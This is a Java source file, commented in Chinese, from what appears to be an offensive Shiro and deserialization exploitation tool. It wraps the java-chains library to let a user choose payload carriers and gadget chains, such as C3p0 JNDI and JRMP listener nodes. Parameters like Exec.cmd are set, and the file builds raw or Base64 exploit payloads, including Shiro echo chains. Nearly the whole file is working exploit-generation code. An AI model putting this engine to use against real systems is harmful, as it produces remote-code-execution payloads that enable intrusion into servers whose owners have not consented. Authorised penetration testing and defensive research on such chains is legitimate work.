package payload;

import org.vulhub.javachains.api.BuildResult;
import org.vulhub.javachains.api.Gadget;
import org.vulhub.javachains.api.GadgetContext;
import org.vulhub.javachains.common.GadgetParam;
import org.vulhub.javachains.common.Result;
import org.vulhub.javachains.core.ChainsRuntime;
import org.vulhub.javachains.core.ExecutionEngine;
import org.vulhub.javachains.core.GadgetFactory;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;

/**
 * 通用利用链构建引擎：把 java-chains 的能力暴露成与漏洞类型无关的形式。
 *
 * <p>职责边界：本类只依赖共享内核与第三方依赖，不引用 shiro / probe / proxy / ui
 * 中任何类型。Shiro 模块的预置链模板与默认参数仍留在该模块自己手里，
 * 这里只提供「选载体 → 追加节点 → 配参数 → 出载荷」这条通用路径。
 *
 * <p>所有构建都在本地内存中完成：不写文件、不发网络请求。
 */
public final class PayloadEngine {

    private static volatile boolean initialized;
    private static volatile String initMessage = "java-chains 尚未初始化。";

    private PayloadEngine() {
    }

    /**
     * 初始化引擎并加载全部节点。
     *
     * <p>java-chains 生成字节码类 gadget 时要访问 JDK 内部 xalan 实现，
     * Java 17 下必须由启动参数开放（见 run.ps1 的 --add-opens）；缺参数时
     * 这里会给出可操作的原因，而不是抛异常。
     */
    public static synchronized void init() {
        if (initialized) return;
        try {
            ChainsRuntime.start();
            initialized = true;
            initMessage = "java-chains 已就绪，可用节点 " + GadgetFactory.getGadgetMap().size() + " 个。";
        } catch (Throwable error) {
            initialized = false;
            initMessage = "java-chains 初始化失败：" + describe(error)
                    + "。若为模块访问异常，请使用 run.ps1 启动（已包含 --add-opens 参数）。";
        }
    }

    public static boolean isReady() {
        return initialized;
    }

    public static String statusMessage() {
        return initMessage;
    }

    /** 全部节点 id（含载体与 gadget），按字母排序。 */
    public static List<String> nodeIds() {
        init();
        if (!initialized) return new ArrayList<String>();
        return new ArrayList<String>(new TreeMap<String, Class<? extends Gadget>>(GadgetFactory.getGadgetMap()).keySet());
    }

    /** 全部载荷载体 id。 */
    public static List<String> payloadIds() {
        List<String> payloads = new ArrayList<String>();
        for (String id : nodeIds()) {
            if (id.toLowerCase(Locale.ROOT).endsWith("payload")) payloads.add(id);
        }
        return payloads;
    }

    /**
     * 某个载体之后可以接的第一个节点。
     *
     * <p>不能用 {@code nextNodes(载体)}：实测载体自身没有后继（返回空集），
     * 后继是从 gadget 才开始的。因此这里按「载体 + 候选节点」逐个做链合法性校验，
     * 通过的即为可选首节点——这是引擎自己的判据，不是本地另写的一套规则。
     */
    public static List<String> firstNodes(String payloadId) {
        init();
        List<String> result = new ArrayList<String>();
        if (!initialized || payloadId == null || payloadId.trim().isEmpty()) return result;
        String payload = payloadId.trim();
        for (String node : nodeIds()) {
            if (node.equals(payload)) continue;
            if (isChainValid(Arrays.asList(payload, node))) result.add(node);
        }
        return result;
    }

    /** 查询某个节点之后可以继续追加的节点 id。 */
    public static List<String> nextNodes(String nodeId) {
        init();
        List<String> result = new ArrayList<String>();
        if (!initialized || nodeId == null || nodeId.trim().isEmpty()) return result;
        try {
            Result next = ExecutionEngine.getNextGadgets(nodeId.trim());
            if (next == null || !next.isSuccess() || next.getData() == null) return result;
            Object data = next.getData();
            if (data instanceof Iterable) {
                for (Object item : (Iterable<?>) data) {
                    String id = toNodeId(item);
                    if (!id.isEmpty() && !result.contains(id)) result.add(id);
                }
            }
            Collections.sort(result);
        } catch (Throwable ignored) {
            // 节点无后续时返回空列表，不把「没有后续」当成错误
        }
        return result;
    }

    /** 查询某个节点的可配置参数。 */
    public static List<GadgetParam> paramsOf(String nodeId) {
        init();
        if (!initialized || nodeId == null || nodeId.trim().isEmpty()) return new ArrayList<GadgetParam>();
        try {
            return ExecutionEngine.getParamsFromGadget(nodeId.trim());
        } catch (Throwable error) {
            return new ArrayList<GadgetParam>();
        }
    }

    /** 一条完整的链是否被引擎认可。 */
    public static boolean isChainValid(List<String> chain) {
        init();
        if (!initialized || chain == null || chain.size() < 2) return false;
        try {
            Result result = ExecutionEngine.validateChainTags(new ArrayList<String>(chain));
            return result != null && result.isSuccess();
        } catch (Throwable error) {
            return false;
        }
    }

    /**
     * 构建载荷。
     *
     * @param payloadId 载体 id，例如 javanativepayload
     * @param gadgets   依次追加的节点 id
     * @param params    节点参数，键用引擎给出的完整形式（如 {@code Exec.cmd}）
     */
    public static PayloadResult build(String payloadId, List<String> gadgets, Map<String, Object> params) {
        RawPayload raw = buildRaw(payloadId, gadgets, params);
        if (!raw.success) return PayloadResult.fail(raw.message);
        List<String> chain = cleanChain(gadgets);
        // 文本形态的载体（如 Shiro）产出的是「已经是 Base64 的文本」，而不是待编码的字节。
        // 必须按文本原样交付：若当成字节再 Base64 一次，调用方拿到的就是双重编码的结果，
        // 解出来既不是原载荷、解密也会失败（实测 Shiro 回显链正是这样被破坏的）。
        if (raw.object instanceof String) {
            return PayloadResult.okText(payloadId.trim(), chain, (String) raw.object);
        }
        if (raw.bytes.length > 0) return PayloadResult.ok(payloadId.trim(), chain, raw.bytes);
        return PayloadResult.fail("载体没有产出任何可交付的载荷：" + payloadId.trim());
    }

    /**
     * 构建载荷并保留原始对象形态。
     *
     * <p>与 {@link #build} 走同一条链路，区别只在返回值：部分载体（如 JRMP 监听载荷）
     * 产出的是可序列化对象而不是字节，发布到只接受 OBJECT 的服务时必须拿到对象本身。
     * 两者共用同一段校验与构建逻辑，避免「文本能生成、发布却报类型不符」这种不一致。
     *
     * @param payloadId 载体 id
     * @param gadgets   依次追加的节点 id
     * @param params    节点参数，键用引擎给出的完整形式（如 {@code Exec.cmd}）
     */
    public static RawPayload buildRaw(String payloadId, List<String> gadgets, Map<String, Object> params) {
        init();
        if (!initialized) return RawPayload.fail(initMessage);
        if (payloadId == null || payloadId.trim().isEmpty()) return RawPayload.fail("请先选择 payload 载体。");
        List<String> chain = cleanChain(gadgets);
        if (chain.isEmpty()) {
            return RawPayload.fail("请至少追加一个 gadget 节点：载体自身不是完整利用链。");
        }
        List<String> full = new ArrayList<String>();
        full.add(payloadId.trim());
        full.addAll(chain);
        if (!isChainValid(full)) {
            return RawPayload.fail("这条链不被引擎认可：" + String.join(" -> ", full)
                    + "。请调整节点顺序或改选后继节点。");
        }
        try {
            Gadget payload = GadgetFactory.create(payloadId.trim());
            if (payload == null) return RawPayload.fail("找不到载体：" + payloadId);
            ExecutionEngine engine = ExecutionEngine.create(payload);
            engine.addAll(chain);
            if (params != null && !params.isEmpty()) {
                engine.setAll(new LinkedHashMap<String, Object>(params));
            }
            BuildResult<?> result = engine.build(new GadgetContext());
            if (result == null) return RawPayload.fail("引擎没有返回构建结果。");
            if (!result.isSuccess()) {
                return RawPayload.fail(result.getMessage() == null ? "构建失败。" : result.getMessage());
            }
            Object data = result.getData();
            if (data instanceof byte[]) {
                return RawPayload.ok((byte[]) data, data);
            }
            if (data instanceof String) {
                // 文本形态的载体（如 Shiro）产出的是 Base64 文本，发布时需要的是它解码后的
                // 真实载荷字节。解码失败说明该载体产出的是普通文本，此时按 UTF-8 取字节，
                // 与 PayloadResult.okText 的判据保持一致。
                String text = (String) data;
                byte[] decoded = util.Codec.decodeBase64(text);
                byte[] bytes = decoded == null
                        ? text.getBytes(java.nio.charset.StandardCharsets.UTF_8) : decoded;
                return RawPayload.ok(bytes, data);
            }
            return RawPayload.ok(new byte[0], data);
        } catch (Throwable error) {
            return RawPayload.fail(describe(error));
        }
    }

    /** 去掉空白节点，得到干净的追加序列。 */
    private static List<String> cleanChain(List<String> gadgets) {
        List<String> chain = new ArrayList<String>();
        if (gadgets == null) return chain;
        for (String gadget : gadgets) {
            if (gadget != null && !gadget.trim().isEmpty()) chain.add(gadget.trim());
        }
        return chain;
    }

    /** 把 {@code Exec.cmd} 与 {@code cmd} 两种写法统一成引擎认识的完整键。 */
    public static Map<String, Object> normalizeParams(Map<String, String> raw) {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        if (raw == null) return params;
        for (Map.Entry<String, String> entry : raw.entrySet()) {
            String key = entry.getKey() == null ? "" : entry.getKey().trim();
            if (key.isEmpty()) continue;
            params.put(key, entry.getValue() == null ? "" : entry.getValue());
        }
        return params;
    }

    /** 目录与运行时载体的不一致清单，空表示一致。 */
    public static List<String> groupIssues() {
        return PayloadCatalog.diff(payloadIds());
    }

    /** 把 Class 或字符串统一转成节点 id。 */
    private static String toNodeId(Object item) {
        if (item == null) return "";
        String simple;
        if (item instanceof Class) {
            simple = ((Class<?>) item).getSimpleName();
        } else {
            simple = String.valueOf(item);
            int dot = simple.lastIndexOf('.');
            if (dot >= 0) simple = simple.substring(dot + 1);
        }
        if (simple.isEmpty()) return "";
        // 引擎注册节点时把类名整体小写（C3p0_C3p0Jndi -> c3p0_c3p0jndi），此处保持一致
        return simple.toLowerCase(Locale.ROOT);
    }

    /** 异常信息扁平化：只取最内层原因，便于直接展示。 */
    private static String describe(Throwable error) {
        Throwable cause = error;
        while (cause.getCause() != null && cause.getCause() != cause) cause = cause.getCause();
        String message = cause.getMessage();
        if (message == null || message.trim().isEmpty()) return cause.getClass().getSimpleName();
        return cause.getClass().getSimpleName() + ": " + message;
    }
}
